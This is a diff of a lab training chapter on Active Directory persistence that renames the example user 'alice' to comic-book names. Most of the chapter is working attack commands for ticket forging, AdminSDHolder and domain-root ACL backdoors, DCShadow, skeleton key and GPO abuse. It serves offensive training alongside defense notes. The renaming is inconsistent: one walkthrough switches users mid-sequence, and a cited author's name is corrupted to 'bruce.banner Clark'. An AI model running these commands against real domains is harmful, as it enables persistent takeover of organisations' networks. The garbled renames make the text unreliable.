@@ -11,6 +11,20 @@ A persistence engagement is fundamentally different from initial-access work. In
 
 ---
 
+## 12.0.1 (BloodHound) Domain Persistence Architecture
+
+```mermaid
+graph LR
+    classDef user fill:#1d2b38,stroke:#00d2ff,stroke-width:2px,color:#fff;
+    classDef group fill:#3a1d38,stroke:#ff00d2,stroke-width:2px,color:#fff;
+    classDef object fill:#333333,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+
+    Steve[steve.rogers]:::user -->|GenericAll| AdminSD[AdminSDHolder]:::object
+    AdminSD -.->|SDProp / FullControl| DA[Domain Admins]:::group
+```
+
+---
+
 ## 12.0 (Concept) Why this chapter is the longest
 
 The previous chapters were about *executing* a chain. This chapter is about *not losing* the position you just earned. That requires:
@@ -102,7 +116,7 @@ Because the **server signature** and **KDC signature** in the PAC are both keyed
 
 ```bash
 # Step 1 — find the domain SID:
-impacket-lookupsid corp.local/alice:'DVADlab2024!'@10.10.0.10 0 | head
+impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 0 | head
 # look for "Domain SID: S-1-5-21-A-B-C"
 
 # Step 2 — forge the TGT:
@@ -225,7 +239,7 @@ Hybrid Golden/legitimate. Request a *real* TGT via AS-REQ, then **decrypt** the 
 ```bash
 # Rubeus diamond uses AES256 + decrypt-modify-reencrypt flow
 .\Rubeus.exe diamond \
-    /user:alice /password:'DVADlab2024!' /enctype:aes256 \
+    /user:peter.parker /password:'DVADlab2024!' /enctype:aes256 \
     /krbkey:<krbtgt_AES256> \
     /ticketuser:Administrator /ticketuserid:500 \
     /groups:512,513,518,519,520 \
@@ -259,7 +273,7 @@ Variant of Diamond that uses **S4U2Self + U2U** to build a PAC for an arbitrary 
 ```
 +----------------------------------------------+
 |  Workflow                                    |
-|  1. Request TGT for alice (real AS-REQ).     |
+|  1. Request TGT for peter.parker (real AS-REQ).     |
 |  2. S4U2Self for Administrator → gets a TGS  |
 |     containing the real PAC for Admin.       |
 |  3. U2U flag asks DC to encrypt with         |
@@ -273,7 +287,7 @@ Variant of Diamond that uses **S4U2Self + U2U** to build a PAC for an arbitrary 
 
 ```bash
 # Rubeus s4u with U2U:
-.\Rubeus.exe asktgt /user:alice /password:'DVADlab2024!' /enctype:aes256 /nowrap
+.\Rubeus.exe asktgt /user:peter.parker /password:'DVADlab2024!' /enctype:aes256 /nowrap
 .\Rubeus.exe s4u /self /impersonateuser:Administrator /nowrap \
     /altservice:krbtgt /ticket:<base64_TGT> /opsec
 ```
@@ -326,14 +340,14 @@ The cross-forest forge (DF-005) uses the **trust account** key, not krbtgt — s
 
 `AdminSDHolder` is a container in `CN=System,DC=corp,DC=local`. Every ~60 minutes, the **SDProp** task on the DC holding the PDC Emulator FSMO role copies its `nTSecurityDescriptor` onto every member of every "protected" group (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Server Operators, Backup Operators, Print Operators, Replicator, krbtgt). The copy **overwrites** the existing DACL on those user objects — that's the entire point of SDProp: keep privileged users from having ACLs delegated away.
 
-If you can write the DACL on AdminSDHolder, you implant an ACE that says "alice has GenericAll on this object." Within 60 minutes (or immediately if you force SDProp), every protected user has alice as GenericAll. Reset their passwords, set shadow creds, anything you want.
+If you can write the DACL on AdminSDHolder, you implant an ACE that says "steve.rogers has GenericAll on this object." Within 60 minutes (or immediately if you force SDProp), every protected user has steve.rogers as GenericAll. Reset their passwords, set shadow creds, anything you want.
 
 ### Exploit
 
 ```bash
-# Add a GenericAll ACE for alice on AdminSDHolder:
+# Add a GenericAll ACE for steve.rogers on AdminSDHolder:
 impacket-dacledit -action 'write' -rights 'FullControl' \
-    -principal 'alice' \
+    -principal 'steve.rogers' \
     -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
     'corp.local/Administrator@10.10.0.10' -hashes :<NT>
 ```
@@ -342,14 +356,14 @@ Or with bloodyAD:
 
 ```bash
 bloodyAD --host 10.10.0.10 -d corp.local -u Administrator -p '...' \
-    add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' alice
+    add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' steve.rogers
 ```
 
 Or with PowerView (on-host):
 
 ```
 PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
-        -PrincipalIdentity alice -Rights All
+        -PrincipalIdentity steve.rogers -Rights All
 ```
 
 ### Force SDProp
@@ -370,19 +384,19 @@ add: RunProtectAdminGroupsTask
 RunProtectAdminGroupsTask: 1
 ```
 
-After SDProp runs, every protected user has alice's ACE. Confirm with:
+After SDProp runs, every protected user has peter.parker's ACE. Confirm with:
 
 ```bash
 impacket-dacledit -action 'read' \
     -target-dn 'CN=Administrator,CN=Users,DC=corp,DC=local' \
-    'corp.local/alice@10.10.0.10' -hashes :<alice_NT>
+    'corp.local/peter.parker@10.10.0.10' -hashes :<alice_NT>
 ```
 
 You should see your ACE near the bottom. Then:
 
 ```bash
 # Reset Administrator's password — you have FullControl on the user object:
-net rpc password 'Administrator' 'NewPass1!' -U corp.local/alice%'<alice_pw>' -S 10.10.0.10
+net rpc password 'Administrator' 'NewPass1!' -U corp.local/peter.parker%'<alice_pw>' -S 10.10.0.10
 ```
 
 ### Reverse-style: AdminSDHolder ACL replicates
@@ -392,8 +406,8 @@ The implant lives on AdminSDHolder itself and replicates to all DCs in the domai
 ### Variants
 
 - Add ACE for `Everyone` or `Authenticated Users` — broadest impact but loud.
-- Add **ExtendedRights: DS-Replication-Get-Changes / -All** — gives alice DCSync via SDProp propagation.
-- Add **ExtendedRights: User-Force-Change-Password** — lets alice reset DA password without GenericAll.
+- Add **ExtendedRights: DS-Replication-Get-Changes / -All** — gives peter.parker DCSync via SDProp propagation.
+- Add **ExtendedRights: User-Force-Change-Password** — lets peter.parker reset DA password without GenericAll.
 
 ### Defense
 
@@ -418,7 +432,7 @@ Because the changes come through the replication path (DRS_REPLICA_SYNC + IDL_DR
 ```
 mimikatz # !+                  # load mimidrv.sys (kernel driver)
 mimikatz # !processtoken       # elevate to SYSTEM
-mimikatz # lsadump::dcshadow /object:CN=alice,CN=Users,DC=corp,DC=local \
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
                               /attribute:primaryGroupID /value:519
 # (mimikatz prints "** Server: <fake DC> registered" and listens)
 
@@ -426,16 +440,16 @@ mimikatz # lsadump::dcshadow /object:CN=alice,CN=Users,DC=corp,DC=local \
 mimikatz # lsadump::dcshadow /push
 ```
 
-Now alice's primary group is Enterprise Admins (RID 519). Logs in corp's normal audit channel look like routine replication.
+Now peter.parker's primary group is Enterprise Admins (RID 519). Logs in corp's normal audit channel look like routine replication.
 
 ### Multi-attribute push
 
 You can chain attributes:
 
 ```
-mimikatz # lsadump::dcshadow /object:CN=alice,... /attribute:sidHistory /value:S-1-5-21-<root>-519
-mimikatz # lsadump::dcshadow /object:CN=alice,... /attribute:userAccountControl /value:66048
-mimikatz # lsadump::dcshadow /object:CN=alice,... /attribute:msDS-KeyCredentialLink /value:<keycred>
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,... /attribute:sidHistory /value:S-1-5-21-<root>-519
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,... /attribute:userAccountControl /value:66048
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,... /attribute:msDS-KeyCredentialLink /value:<keycred>
 mimikatz # lsadump::dcshadow /push
 ```
 
@@ -476,7 +490,7 @@ Then anywhere in the domain:
 ```bash
 impacket-psexec corp.local/Administrator:mimikatz@dc01.corp.local   # works (skeleton)
 impacket-psexec corp.local/Administrator:'<real_pw>'@dc01.corp.local # still works (real pw)
-impacket-psexec corp.local/alice:mimikatz@dc01.corp.local            # works for ANY user
+impacket-psexec corp.local/peter.parker:mimikatz@dc01.corp.local            # works for ANY user
 ```
 
 ### Scope
@@ -543,10 +557,10 @@ Plant a `msDS-KeyCredentialLink` on a protected user. Even after AdminSDHolder r
 
 ```bash
 # Plant:
-certipy shadow auto -u alice@corp.local -p '...' -account 'Administrator' -dc-ip 10.10.0.10
+certipy shadow auto -u peter.parker@corp.local -p '...' -account 'Administrator' -dc-ip 10.10.0.10
 
 # Or manually with explicit add + save device key:
-certipy shadow add -u alice@corp.local -p '...' -account 'Administrator' \
+certipy shadow add -u peter.parker@corp.local -p '...' -account 'Administrator' \
     -dc-ip 10.10.0.10 -out admin-keycred
 # Save admin-keycred.pem and admin-keycred.cer
 
@@ -578,7 +592,7 @@ Edit a GPO that targets DCs (e.g., **Default Domain Controllers Policy**) or a h
 # SharpGPOAbuse (Windows in-host):
 SharpGPOAbuse.exe --AddUserTask --TaskName "Update" \
     --Author "NT AUTHORITY\SYSTEM" \
-    --Command "cmd.exe" --Arguments "/c net group 'Domain Admins' alice /add /domain" \
+    --Command "cmd.exe" --Arguments "/c net group 'Domain Admins' peter.parker /add /domain" \
     --GPOName "Default Domain Controllers Policy"
 ```
 
@@ -589,7 +603,7 @@ Wait for next gpupdate (~90 min default + 0-30min random offset) or force on a v
 ```bash
 pygpoabuse.py corp.local/Administrator:'...'@10.10.0.10 \
     --gpo-id '{31B2F340-016D-11D2-945F-00C04FB984F9}' \
-    --command 'net group "Domain Admins" alice /add /domain'
+    --command 'net group "Domain Admins" peter.parker /add /domain'
 ```
 
 The GUID is the GPO ID from `gpme.msc` or `Get-GPO -All | select DisplayName,Id`.
@@ -641,7 +655,7 @@ If you can write `sIDHistory` directly (via DCShadow, or because you're DA in a 
 ### Inject via DCShadow
 
 ```
-mimikatz # lsadump::dcshadow /object:CN=alice,CN=Users,DC=corp,DC=local \
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
     /attribute:sIDHistory /value:S-1-5-21-<rootSID>-519
 mimikatz # lsadump::dcshadow /push
 ```
@@ -659,7 +673,7 @@ impacket-ticketer \
     Administrator
 ```
 
-Now alice's PAC carries Enterprise Admins anywhere in the forest — until SID filtering kicks in.
+Now peter.parker's PAC carries Enterprise Admins anywhere in the forest — until SID filtering kicks in.
 
 ### SID filtering matrix
 
@@ -690,9 +704,9 @@ A forest trust has a **trust key**: the password of the trust account (a hidden 
 +---------------------------------------------------------+
 |  Inter-realm TGT (forged)                               |
 |    crealm:   CORP.LOCAL                                 |
-|    cname:    alice                                      |
+|    cname:    peter.parker                                      |
 |    sname:    krbtgt/FINANCE.LOCAL                       |
-|    PAC.LOGON_INFO.UserId:    alice's RID                |
+|    PAC.LOGON_INFO.UserId:    peter.parker's RID                |
 |    PAC.LOGON_INFO.ExtraSids: S-1-5-21-FINANCE-519       |
 |    Server sig:               HMAC(trust_key, ...)       |
 |    KDC sig:                  HMAC(trust_key, ...)       |
@@ -763,7 +777,7 @@ Two paths from child DA → forest root EA:
 
 ```bash
 # You have krbtgt of corp.local (DCSync from DA).
-# Forge a Golden TGT for alice@corp.local with extra-sid = root Enterprise Admins:
+# Forge a Golden TGT for peter.parker@corp.local with extra-sid = root Enterprise Admins:
 impacket-ticketer \
     -nthash <corp_krbtgt_NT> \
     -domain-sid S-1-5-21-CORP \
@@ -782,7 +796,7 @@ impacket-getST -k -no-pass \
 impacket-psexec -k -no-pass dc01.root.corp
 ```
 
-DC of `root.corp` sees alice with EA in PAC → grants admin access.
+DC of `root.corp` sees peter.parker with EA in PAC → grants admin access.
 
 ### B. Inter-realm TGT forge
 
@@ -902,15 +916,15 @@ If you become **Schema Admin**, you can modify the AD schema itself. The schema 
 ```
 PS> $sch = [ADSI]'LDAP://CN=Schema,CN=Configuration,DC=root,DC=corp'
 PS> # Create a new attribute "userBackup" on User class
-PS> # Default ACL: grant alice ReadProperty on it
+PS> # Default ACL: grant peter.parker ReadProperty on it
 PS> # Use the attribute to store an encrypted password or key cred
 ```
 
-Now `alice` has a *schema-level* place to stash a key that survives any DACL audit because schema ACLs are seldom audited.
+Now `peter.parker` has a *schema-level* place to stash a key that survives any DACL audit because schema ACLs are seldom audited.
 
 ### Idea — modify the default security descriptor of a class
 
-The default SD of the `user` class controls the DACL applied to every *new* user object. Adding alice as GenericAll to that SD means every user created from this point forward has alice as GenericAll.
+The default SD of the `user` class controls the DACL applied to every *new* user object. Adding peter.parker as GenericAll to that SD means every user created from this point forward has peter.parker as GenericAll.
 
 ```
 PS> Set-ADObject -Identity 'CN=User,CN=Schema,CN=Configuration,DC=root,DC=corp' \
@@ -930,17 +944,17 @@ This is *the* canonical "I will never be removed" backdoor — it self-propagate
 
 ## 12.19 Security descriptor backdoor on Domain root (DF-014)
 
-The domain object (`DC=corp,DC=local`) has an `nTSecurityDescriptor` controlling who can do directory-wide things including DCSync. Add an ACE granting alice **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All**:
+The domain object (`DC=corp,DC=local`) has an `nTSecurityDescriptor` controlling who can do directory-wide things including DCSync. Add an ACE granting peter.parker **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All**:
 
 ```bash
 impacket-dacledit -action 'write' \
     -rights 'DCSync' \
-    -principal alice \
+    -principal peter.parker \
     -target-dn 'DC=corp,DC=local' \
     'corp.local/Administrator@10.10.0.10' -hashes :<NT>
 ```
 
-Now alice can DCSync the domain forever — no group membership, no exposed credential. The ACE survives password resets, AdminSDHolder runs (it doesn't touch the domain object's SD), and most audits because few orgs baseline the domain root SD.
+Now peter.parker can DCSync the domain forever — no group membership, no exposed credential. The ACE survives password resets, AdminSDHolder runs (it doesn't touch the domain object's SD), and most audits because few orgs baseline the domain root SD.
 
 A defender's only signal is 5136 on `DC=corp,DC=local` for an `nTSecurityDescriptor` change — very low volume, so easy to alert on if you remember to set it up.
 
@@ -956,13 +970,13 @@ DVAD intentionally clears `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` on the corp↔fin
 
 ```bash
 # Set SID history:
-mimikatz # lsadump::dcshadow /object:CN=alice,CN=Users,DC=corp,DC=local \
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
     /attribute:sIDHistory /value:S-1-5-21-FINANCE-519
 mimikatz # lsadump::dcshadow /push
 
 # Now log into finance via Kerberos cross-realm:
-impacket-getTGT corp.local/alice:'...'@dc01.corp.local
-impacket-getST -spn 'cifs/dc01.finance.local' -dc-ip 10.20.0.10 -k corp.local/alice
+impacket-getTGT corp.local/peter.parker:'...'@dc01.corp.local
+impacket-getST -spn 'cifs/dc01.finance.local' -dc-ip 10.20.0.10 -k corp.local/peter.parker
 impacket-psexec -k -no-pass dc01.finance.local
 ```
 
@@ -975,7 +989,7 @@ impacket-psexec -k -no-pass dc01.finance.local
 A user in corp.local can be added to a group in finance.local if there's a foreign-security-principal (FSP) entry. The FSP is a stub object in `CN=ForeignSecurityPrincipals,DC=finance,DC=local` with name = the corp user's SID. Add that FSP to a privileged group in finance:
 
 ```bash
-# As DA in corp, add alice's SID as FSP into finance EA via cross-realm LDAP:
+# As DA in corp, add peter.parker's SID as FSP into finance EA via cross-realm LDAP:
 ldapmodify -H ldaps://dc01.finance.local -D "corp\\Administrator" -w '...' <<EOF
 dn: CN=Enterprise Admins,CN=Users,DC=finance,DC=local
 changetype: modify
@@ -1244,7 +1258,7 @@ Modify the `defaultSecurityDescriptor` of `classSchema=user`. Every future user 
 
 ### 12.31.2 Certificate template ACL backdoor (PER-019)
 
-Add `Enrollee` rights for a low-priv user (`alice`) on a sensitive cert template like `EnterpriseAdmin`. Re-enrollment gives EA.
+Add `Enrollee` rights for a low-priv user (`peter.parker`) on a sensitive cert template like `EnterpriseAdmin`. Re-enrollment gives EA.
 
 ### 12.31.3 Roastable backup of krbtgt
 
@@ -1318,21 +1332,21 @@ Chapter 13 expands each of these into Sigma rules and KQL.
 ### Exercise 12.C — Diamond ticket vs Golden detection
 
 1. Forge a Golden as Administrator. Use it. Capture 4768/4769 on the DC.
-2. Forge a Diamond as Administrator from alice's real TGT. Use it. Capture 4768/4769.
+2. Forge a Diamond as Administrator from peter.parker's real TGT. Use it. Capture 4768/4769.
 3. Compare the two event sequences. Which fields differ? Which fields are identical to a normal Administrator logon?
 
 ### Exercise 12.D — AdminSDHolder backdoor
 
-1. Add a GenericAll ACE for `alice` on AdminSDHolder.
-2. Confirm `dacledit --read --target-dn 'CN=Administrator,...'` doesn't yet show alice.
+1. Add a GenericAll ACE for `steve.rogers` on AdminSDHolder.
+2. Confirm `dacledit --read --target-dn 'CN=Administrator,...'` doesn't yet show steve.rogers.
 3. Force SDProp via `RunProtectAdminGroupsTask=1`.
-4. Re-check — alice is now there.
+4. Re-check — steve.rogers is now there.
 5. Reset Administrator's password via `net rpc password`. Capture the krb5 / SMB exchange.
 
 ### Exercise 12.E — DCShadow attribute push
 
-1. Make alice EA via DCShadow `primaryGroupID=519`.
-2. Confirm in LDAP that alice's primary group is 519.
+1. Make peter.parker EA via DCShadow `primaryGroupID=519`.
+2. Confirm in LDAP that peter.parker's primary group is 519.
 3. Find the matching event in the DC's directory service log — is there a 5136?
 4. Now use the corresponding Defender for Identity / ATA detection signatures and explain why it would fire.
 
@@ -1340,7 +1354,7 @@ Chapter 13 expands each of these into Sigma rules and KQL.
 
 1. Skeleton-key dc01 from a DA shell.
 2. Confirm `impacket-psexec corp.local/Administrator:mimikatz@dc01.corp.local` works.
-3. Try `corp.local/alice:mimikatz@dc01.corp.local` — also works.
+3. Try `corp.local/peter.parker:mimikatz@dc01.corp.local` — also works.
 4. Reboot dc01. Re-try — fails.
 5. Re-skeleton — works again.
 
@@ -1360,9 +1374,9 @@ Chapter 13 expands each of these into Sigma rules and KQL.
 
 ### Exercise 12.I — GPO startup-script implant
 
-1. SharpGPOAbuse `AddComputerScript` against Default Domain Controllers Policy with `net group "Domain Admins" alice /add /domain`.
+1. SharpGPOAbuse `AddComputerScript` against Default Domain Controllers Policy with `net group "Domain Admins" peter.parker /add /domain`.
 2. Run `gpupdate /force` on dc01 (you need shell on dc01 first).
-3. Confirm alice ∈ Domain Admins.
+3. Confirm peter.parker ∈ Domain Admins.
 4. Find the SYSVOL file that holds the implant — identify the event you'd alert on.
 
 ### Exercise 12.J — Trust ticket to finance.local
@@ -1415,7 +1429,7 @@ After completing 12.A–12.K, enumerate every persistence artefact you've plante
 - **Sean Metcalf — *Sneaky AD Persistence Tricks*** — the canonical reference (adsecurity.org).
 - **Benjamin Delpy — Mimikatz wiki, `lsadump::dcshadow`** notes.
 - **Will Schroeder — *A Case Study in Wagging the Dog*** (S4U-derived persistence).
-- **Charlie Clark — *Diamond Tickets*** (Semperis).
+- **bruce.banner Clark — *Diamond Tickets*** (Semperis).
 - **Pixis — *Sapphire Tickets*** (hackndo).
 - **Microsoft — *Security Considerations for Trusts*** — Microsoft's own statement that forest = boundary.
 - **Specter Ops — *Certified Pre-Owned*** (Schroeder, Christensen) — sections on ESC1 + cert persistence.
